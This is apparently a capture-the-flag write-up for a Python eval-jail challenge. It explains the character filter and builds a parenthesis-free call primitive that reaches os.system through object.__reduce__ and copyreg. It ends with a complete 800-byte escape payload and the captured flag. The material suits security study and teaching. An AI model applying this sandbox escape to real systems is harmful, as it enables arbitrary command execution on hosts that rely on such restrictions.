@@ -1,0 +1,240 @@
+---
+title: 'PwnSec CTF 2026 - jailincpython'
+description: 'Escaping a parenthesis-, quote-, and digit-free Python eval jail using a comprehension setattr as a call primitive and object.__reduce__ to reach the real builtins'
+date: 2026-09-13
+tags: ['writeup', 'misc', 'python', 'jail-escape', 'sandbox-escape', 'filter-bypass', 'pwnsec', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A one-line `eval` jail with parentheses, quotes and digits all filtered out, at most two dots, and no builtins. The way through is a comprehension `for` target that performs `setattr` with no parentheses anywhere, which turns a user-defined class into a programmable one-argument call primitive.
+
+## Challenge Description
+
+> Some say this jail is impossible. Everything useful is banned.
+
+`main.py` is 20 lines:
+
+```python
+#!/usr/bin/python3
+import re
+
+pattern = re.compile(
+    r'^(?:[^\[\]"\'0-9()]+|\[[^\[\]"\'0-9()]*\])*$'
+)
+
+class hint_A():
+    ...
+
+hint_B = "%jailincpython"
+
+def main():
+    user_input = input("~ ")
+    if (not bool(pattern.fullmatch(user_input))
+        or user_input.count('.') > 2
+        or not user_input.isascii()
+        or len(user_input) > 800):
+        print("Nope!!")
+        exit()
+
+    print(eval(user_input, {'globals': {}, '__builtins__': {"hint_A":hint_A, "hint_B":hint_B}}, {}))
+
+if __name__ == "__main__":
+    main()
+```
+
+One line of input, one `eval`, and the result is printed.
+
+## Reading the filter
+
+The regex is the whole challenge. It says the input is a sequence of two kinds of chunk: a run of characters from `[^\[\]"\'0-9()]`, or a bracketed group `\[ [^\[\]"\'0-9()]* \]`. Unpacking that gives five hard constraints:
+
+| Constraint | Consequence |
+|---|---|
+| `(` and `)` never match | **No function calls.** No generator expressions, no tuple displays, no grouping. |
+| `"` and `'` never match | **No string literals.** |
+| `0-9` never match | **No numeric literals.** |
+| Inside a `[...]` group the class still excludes `[` and `]` | **Square brackets cannot nest.** `a[b[c]]` is rejected; `a[b][c]` is fine. |
+| `count('.') > 2` | **At most two dots in the entire payload.** Note `...` (Ellipsis) is three dots, so it is unusable too. |
+
+Plus ASCII only and 800 bytes.
+
+What is *not* restricted is important: **braces are completely unconstrained** and they nest freely. Set displays, dict displays, set comprehensions and dict comprehensions are all available, and so is the walrus operator inside them.
+
+The eval namespace gives us:
+
+- `hint_A` — an empty user-defined class
+- `hint_B` — the string `"%jailincpython"`
+- `globals` — an empty dict (a decoy; it shadows nothing useful)
+- `__builtins__` — resolvable as a name, but it is just the fake two-entry dict
+- `True`, `False`, `None` — these are *keywords*, not builtins, so they survive
+
+Two immediate consequences. First, integers are reachable: `True+True` is `2`, so any number can be spelled. Second, `hint_B` contains `%` at index 0 and `c` at index 7, so `"%c"` is constructible and `"%c" % n` is `chr(n)`. That is clearly the intended route to arbitrary strings, and it is why `hint_B` exists.
+
+`hint_A` exists for two reasons that only become clear later: it saves a dot (`hint_A.__base__` reaches `object` in one dot instead of two), and, critically, it is a **user-defined class, so its attributes are writable**.
+
+## The real problem: calling anything at all
+
+With parentheses banned, `eval` restricted to a single expression, and no builtins, the only way to invoke code is to make the interpreter do it for you. Almost every call during expression evaluation dispatches through a **type-level** dunder lookup (`__add__`, `__getitem__`, `__str__`, `__hash__`, `__iter__`, …). Those are useless here, because we can only produce instances of built-in types, whose dunders are fixed and harmless.
+
+The interesting cases are the **instance-level** lookups, where CPython fetches an attribute off the object itself and calls it:
+
+| Expression | Attribute looked up on the instance | Called with |
+|---|---|---|
+| `{**X}` | `X.keys` | 0 args |
+| `C[k]` where `C` is a class | `C.__class_getitem__` | 1 arg |
+| `dict[u][v]` | `u.__typing_prepare_subst__` | 2 args |
+| `dict[u][v]` | `u.__typing_subst__` | 1 arg |
+
+The last two come from PEP 585 generic-alias substitution. So the call primitive exists. The blocker is that **all four require an object whose attribute namespace you control**, and we cannot create one:
+
+- Setting an attribute needs an assignment statement, and `eval` only takes an expression.
+- The only object in reach with dynamic attribute lookup is `types.GenericAlias`, whose `ga_getattro` forwards to `__origin__` — and the origin is always a *class*. Every reachable class's `keys` is an unbound `method_descriptor` or a plain function, so `{**dict[X]}` dies with `unbound method dict.keys() needs an argument`. No reachable class has `__typing_subst__` at all.
+
+At this point the jail genuinely looks impossible, which is presumably the joke in the description.
+
+## The breakthrough: setattr with no parentheses
+
+A comprehension's `for` target does not have to be a bare name. It can be **any assignment target, including an attribute reference**:
+
+```python
+{hint_A[hint_B] for hint_A.__class_getitem__ in {hint_A.__class__}}
+```
+
+This is legal Python, it passes the filter, and it evaluates to `{str}`. The `for` clause performs `hint_A.__class_getitem__ = type`, and because `hint_A` is a user-defined class the assignment sticks. Immediately afterwards, `hint_A[x]` invokes `type(x)`.
+
+That is the escape. **`hint_A[X]` is now a one-argument call primitive whose target we choose, and it returns the result directly** (unlike the `keys` or `__typing_subst__` hooks, whose results are consumed or wrapped).
+
+## Budgeting the two dots
+
+The dot limit is the real difficulty. One dot is spent on the `for` target (`hint_A.__class_getitem__`). That leaves exactly **one dot for everything else**. The trick is to spend it inside a lambda, so a single textual dot becomes a reusable operation:
+
+```python
+N := lambda a: a.__getattribute__
+```
+
+Now `N` is a universal accessor. For any non-class object `X`, `N(X)` is a *bound* `__getattribute__`, that is, a one-argument `getattr` for `X`. For a class, it returns the unbound `object.__getattribute__`, which can be re-bound through its `__get__`. Combined with the call primitive, this gives arbitrary attribute access by name, and the names themselves are built with `%c`. Total dots used: exactly two.
+
+## The chain to the real builtins
+
+```text
+G   = N(hint_A)          # unbound object.__getattribute__   (a wrapper_descriptor)
+gG  = N(G)               # bound getattr ON G
+GET = gG('__get__')      # G.__get__ : the descriptor binder
+OBJ = gG('__objclass__') # object
+gO  = GET(OBJ)           # getattr bound to `object`
+OD  = gO('__dict__')     # object.__dict__  (mappingproxy)
+NEW = OD['__new__']      # object.__new__
+RED = OD['__reduce__']   # unbound object.__reduce__
+I   = NEW(hint_A)        # a heap-type instance
+T   = RED(I)             # (copyreg._reconstructor, (hint_A, object, None))
+REC = T[-2]              # copyreg._reconstructor  <- a real Python function
+gR  = N(REC)             # REC is not a class, so N alone gives a bound getattr
+B   = gR('__builtins__') # the REAL builtins dict
+IMP = B['__import__']
+OS  = IMP('os')
+SYS = N(OS)('system')
+SYS(cmd)                 # arbitrary command execution
+```
+
+Three notes on why it is shaped this way.
+
+**Why `copyreg` and not `__subclasses__`.** `object.__subclasses__` is a *bound* zero-argument method, and our primitive passes exactly one argument. Reaching a zero-argument call would need the `keys` hook, which would cost a second attribute assignment and therefore a third dot. The `__reduce__` route sidesteps this: `object.__reduce__(instance)` returns a tuple containing `copyreg._reconstructor`, a genuine Python-level function, and *every* Python-level function carries `__builtins__` pointing at the real builtins dict.
+
+**Why we need an instance.** `copyreg._reduce_ex` refuses non-heap types (`cannot pickle 'type' object`). Only an instance of a user-defined class works, and the only way to make one without a zero-argument call is `object.__new__(hint_A)`.
+
+**Why we go through `object.__dict__`.** `GET(C)` produces `object.__getattribute__` bound to a class, which resolves attributes using the *metaclass* MRO. So `gO('__new__')` returns `type.__new__`, not `object.__new__`. Fetching `object.__dict__` once and subscripting it gives the genuinely unbound `__new__` and `__reduce__`.
+
+## The driver
+
+The chain needs fifteen calls with fifteen different callables installed, but the dotted target may appear only once. The solution is a single set comprehension whose one `for hint_A.__class_getitem__ in ...` clause is driven by a table, re-installing a different hook on every pass:
+
+```python
+{t for R in {t}
+   for Q in [PHASE, PHASE, ...]
+   for K in {[*Q][~-t]}                                    # ARG  = first key
+   for P in {[*Q][-t]}                                     # POST = last key
+   for M.__class_getitem__ in {Q[K] is t and S or Q[K] or R}   # install hook
+   for W in {K is t and S or K or R}                       # resolve argument
+   for S in {R}                                            # shift history
+   for R in {M[W][P] if P != K else M[W]}}                 # call
+```
+
+Each phase is a small dict: `{ARG: HOOK}` for a plain call, or `{ARG: HOOK, POST: t}` when the result must be subscripted.
+
+**Sentinels.** In both the `ARG` and `HOOK` slots, `False` means "use the previous result `R`" and `True` means "use the result before that, `S`". Anything else is a literal. The selector `V is t and S or V or R` implements the three-way choice with short-circuiting and no parentheses.
+
+**Two-deep history.** `R` alone is not enough, because several steps reuse a value from two calls back. `S` holds the previous result and is shifted at the end of each phase.
+
+**The post-index.** `for R in {expr}` puts the value in a set, which **hashes** it. Two intermediate values are unhashable: `object.__dict__` (a mappingproxy) and the builtins dict. The post-index fixes this by subscripting inside the same clause, so the unhashable value is never bound.
+
+## Gotchas
+
+1. **`(X := ...)` is a SyntaxError in a comprehension `if` clause** without parentheses, so the obvious "bind without hashing" trick is unavailable. Hence the post-index above.
+2. **Comprehension `for` targets are function-local.** Binding `R` in the preamble and then assigning it inside the comprehension raises `UnboundLocalError`. `R` must be initialised *inside*, with a leading `for R in {t}`.
+3. **Lambdas cannot see walrus-bound names.** With `eval(src, globals, locals)`, walrus assignments land in *locals*, while a lambda captures *globals*. Any helper lambda must use only keyword constants such as `False`.
+4. **Lists cannot be bound the obvious way.** `{L := [a, b]}` fails (unhashable), and `for L in [[a, b]]` is rejected as nested brackets. The working primitive is a starred target: `for *L, in [X]`, with the trailing comma mandatory.
+5. **Nested subscripts are rejected.** `Q[W[IDX]]` fails the regex; it has to be hoisted into a separate `for` clause.
+6. **`hint_A` is mutated for the rest of the process**, which matters when testing locally: reload the module between attempts.
+
+## Encoding strings without quotes or digits
+
+Every attribute name has to be constructed. The scheme:
+
+- `q := hint_B[::k+~d]` gives `"%c"`. With `k = 10` and `d = 2`, the step is `7`, and `"%jailincpython"[::7]` is exactly indices 0 and 7, that is `'%'` and `'c'`.
+- `q % N` is `chr(N)`, and characters concatenate with `+`. Because `%` binds tighter than `+`, `q%A + q%B` already parses correctly with no grouping.
+- Integers come from `t := True` plus a handful of anchors. Since `%`'s right operand must be a unary/power/atom, sums re-parse wrongly there; `-~x` (x+1) and `~-x` (x-1) give factor-level increments instead.
+- `q%N*d` doubles a character in one go, which is handy for `__`.
+
+A fun alternative I explored and dropped: `'%a' % X` yields repr strings, and `"True"`, `"False"`, `"<class '__main__.hint_A'>"` and `"<function <lambda> at 0x"` between them supply `r u e s _ m . b d f x` for free, leaving only `g` and `w` to build. The shared-fragment `%c` scheme came out smaller overall.
+
+Final size, the binding constraint of the whole challenge:
+
+| Command | Payload size |
+|---|---|
+| `sh` | 759 |
+| `cat *` | 788 |
+| `cat /*` | **800** (exactly at the limit) |
+
+## The payload
+
+Reading the flag file, 800 bytes, two dots:
+
+```text
+{t:=True,d:=t+t,k:=d*d*d+d,q:=hint_B[::k+~d],A:=d-k*~k,B:=-~k<<d,C:=d*d-~A,D:=C+~k,E:=D-~-k,F:=d-~D,a:=q%~-~-E*d,b:=q%-~k**d,c:=q%~-~-C,e:=q%~-C,f:=q%-~-~E,g:=q%~-D,h:=q%~-A,i:=q%-~-~A,j:=q%k**d,l:=e+a}and{M:=hint_A,N:=lambda a:a.__getattribute__}and{t for R in{t}for Q in[{M:N},{~-t:N},{a+q%~-~-~-D+b+l:False},{a+h+q%-~E+q%D+f+q%~-F+q%E+c*d+a:True},{~-t:True},{a+j+g+f+l:False,a+q%-~F+b+q%-~-~C+a:t},{a+j+g+f+l:True,a+i+b+j+q%C+f+b+a:t},{M:True},{~-t:True,-d:t},{~-t:N},{a+q%-~E+q%C+g+q%~-F+e+g+q%-~F+c+a:False,a+g+q%F+q%A+h+i+l:t},{h+c:False},{~-t:N},{c+q%-~-~-~-~C+c+e+b+q%F:False},{f+q%E+e+q%d**-~d**d+q%-~-~-~B+q%~-~-B:False}]for K in{[*Q][~-t]}for P in{[*Q][-t]}for M.__class_getitem__ in{Q[K]is t and S or Q[K]or R}for W in{K is t and S or K or R}for S in{R}for R in{M[W][P]if P!=K else M[W]}}
+```
+
+The three `and`-joined blocks are the character/number preamble, the two working names, and the driver comprehension. The fifteen dicts inside `[...]` are the phase table.
+
+## Getting the flag
+
+First run used `cat *` against the live service, which dumped `main.py` and the container entrypoint:
+
+```bash
+#!/bin/sh
+
+RAND=$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')
+FLAGFILE="/${RAND}.txt"
+echo "$FLAG" > "$FLAGFILE"
+
+unset FLAG
+
+socat -T30 TCP-L:1339,fork,reuseaddr EXEC:"python3 /app/main.py",pty,stderr,setsid,sane,raw,echo=0
+```
+
+The flag is written to a randomly named file at the filesystem root and then unset from the environment, so guessing a filename was never going to work. `cat /*` prints it (the directory entries produce harmless errors on stderr).
+
+```text
+$ python3 solve.py 'cat /*' > payload.txt
+$ python3 remote.py payload.txt
+~ pwnsec{0b503045100d1551}
+cat: /bin: Is a directory
+...
+{True}
+```
+
+## Flag
+
+```text
+pwnsec{0b503045100d1551}
+```
